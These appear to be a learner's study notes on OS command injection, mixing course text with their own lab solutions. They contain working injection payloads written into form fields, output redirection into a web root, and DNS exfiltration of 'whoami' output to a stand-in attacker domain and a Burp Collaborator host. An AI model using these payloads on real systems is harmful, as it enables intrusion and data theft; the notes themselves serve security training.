* OS command injection
In this section, we explain what OS command injection is, and describe how vulnerabilities can be detected and exploited. We also show you some useful commands and techniques for different operating systems, and describe how to prevent OS command injection.
** What is OS command injection?
OS command injection is also known as shell injection. It allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data. Often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, and exploit trust relationships to pivot the attack to other systems within the organization.
** Injecting OS commands
In this example, a shopping application lets the user view whether an item is in stock in a particular store. This information is accessed via a URL:

https://insecure-website.com/stockStatus?productID=381&storeID=29
To provide the stock information, the application must query various legacy systems. For historical reasons, the functionality is implemented by calling out to a shell command with the product and store IDs as arguments:

stockreport.pl 381 29
This command outputs the stock status for the specified item, which is returned to the user.

The application implements no defenses against OS command injection, so an attacker can submit the following input to execute an arbitrary command:

& echo aiwefwlguh &
If this input is submitted in the productID parameter, the command executed by the application is:

stockreport.pl & echo aiwefwlguh & 29
The echo command causes the supplied string to be echoed in the output. This is a useful way to test for some types of OS command injection. The & character is a shell command separator. In this example, it causes three separate commands to execute, one after another. The output returned to the user is:

Error - productID was not provided
aiwefwlguh
29: command not found
The three lines of output demonstrate that:

The original stockreport.pl command was executed without its expected arguments, and so returned an error message.
The injected echo command was executed, and the supplied string was echoed in the output.
The original argument 29 was executed as a command, which caused an error.
Placing the additional command separator & after the injected command is useful because it separates the injected command from whatever follows the injection point. This reduces the chance that what follows will prevent the injected command from executing.
*** Lab: OS command injection, simple case
- solved:
  this lab used the above; however, you had to url encode the & signs.
  You can do this by pressing *CONTROL U* when selecting text in burp suite.
  you can also read the script by using the command cat {scriptname.sh}

** Useful commands
After you identify an OS command injection vulnerability, it's useful to execute some initial commands to obtain information about the system. Below is a summary of some commands that are useful on Linux and Windows platforms:

Purpose of command	Linux	Windows
Name of current user	whoami	whoami
Operating system	uname -a	ver
Network configuration	ifconfig	ipconfig /all
Network connections	netstat -an	netstat -an
Running processes	ps -ef	tasklist

** Blind OS command injection vulnerabilities
Many instances of OS command injection are blind vulnerabilities. This means that the application does not return the output from the command within its HTTP response. Blind vulnerabilities can still be exploited, but different techniques are required.

As an example, imagine a website that lets users submit feedback about the site. The user enters their email address and feedback message. The server-side application then generates an email to a site administrator containing the feedback. To do this, it calls out to the mail program with the submitted details:

mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
The output from the mail command (if any) is not returned in the application's responses, so using the echo payload won't work. In this situation, you can use a variety of other techniques to detect and exploit a vulnerability.

*** Detecting blind OS command injection using time delays
You can use an injected command to trigger a time delay, enabling you to confirm that the command was executed based on the time that the application takes to respond. The ping command is a good way to do this, because lets you specify the number of ICMP packets to send. This enables you to control the time taken for the command to run:

& ping -c 10 127.0.0.1 &
This command causes the application to ping its loopback network adapter for 10 seconds.

**** Lab: Blind OS command injection with time delays
PRACTITIONER

LAB
Solved
This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.
- solution:
  I used the steps above, I pinged an ip for 10 seconds, I had to URL encode again.

*** Exploiting blind OS command injection by redirecting output
You can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser. For example, if the application serves static resources from the filesystem location /var/www/static, then you can submit the following input:

& whoami > /var/www/static/whoami.txt &
The > character sends the output from the whoami command to the specified file. You can then use the browser to fetch https://vulnerable-website.com/whoami.txt to retrieve the file, and view the output from the injected command.

**** Lab: Blind OS command injection with output redirection
PRACTITIONER

LAB
Solved
This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

/var/www/images/
The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the whoami command and retrieve the output.
- solution:
  I used the whoami > /path/whoami.txt & command to create a path where the images are stored.
  I then changed the filename get variable of one of the images to the newly created text file. this gave me the name of the pc.
  csrf=Qo0dgJNn8haMihH2q4ieQmY0Z8TY4nIN&name=will&email=%26+%26+whoami+>+/var/www/images/whoami.txt+%26%26peter%40peter.com&subject=twe&message=fdsf


GET /image?filename=whoami.txt HTTP/2

*** Exploiting blind OS command injection using out-of-band (OAST) techniques
You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:

& nslookup kgji2ohoyw.web-attacker.com &
This payload uses the nslookup command to cause a DNS lookup for the specified domain. The attacker can monitor to see if the lookup happens, to confirm if the command was successfully injected.

**** Lab: Blind OS command injection with out-of-band interaction
PRACTITIONER

LAB
Solved
This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.
- solution:
  I solved this by using the burp collaborator to retrieve a system to use within nslookup.
  I then modified the email variable, see below:
  & nslookup jj67tdihgqun88fa26coo8skjbp2ds1h.oastify.com &

*** Continued
The out-of-band channel provides an easy way to exfiltrate the output from injected commands:

& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
This causes a DNS lookup to the attacker's domain containing the result of the whoami command:

wwwuser.kgji2ohoyw.web-attacker.com

**** Lab: Blind OS command injection with out-of-band data exfiltration
PRACTITIONER

LAB
Solved
This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.
- solved:
  I did the same as the previous lab; however, I concated the whoami command to the address:
  csrf=Ul3liagcRZ3Vr5Np17O2t0eerCuHWpnU&name=will&email=%26+nslookup+`whoami`.jj67tdihgqun88fa26coo8skjbp2ds1h.oastify.com+%26peter%40peter.com&subject=test&message=test
  pretty sure that the concatation becomes a subdomain of the address, hence the fullstop.

**** Ways of injecting OS commands
You can use a number of shell metacharacters to perform OS command injection attacks.

A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems:

&
&&
|
||
The following command separators work only on Unix-based systems:

;
Newline (0x0a or \n)
On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

`
injected command `
$(
injected command )
The different shell metacharacters have subtly different behaviors that might change whether they work in certain situations. This could impact whether they allow in-band retrieval of command output or are useful only for blind exploitation.

Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using " or ') before using suitable shell metacharacters to inject a new command.
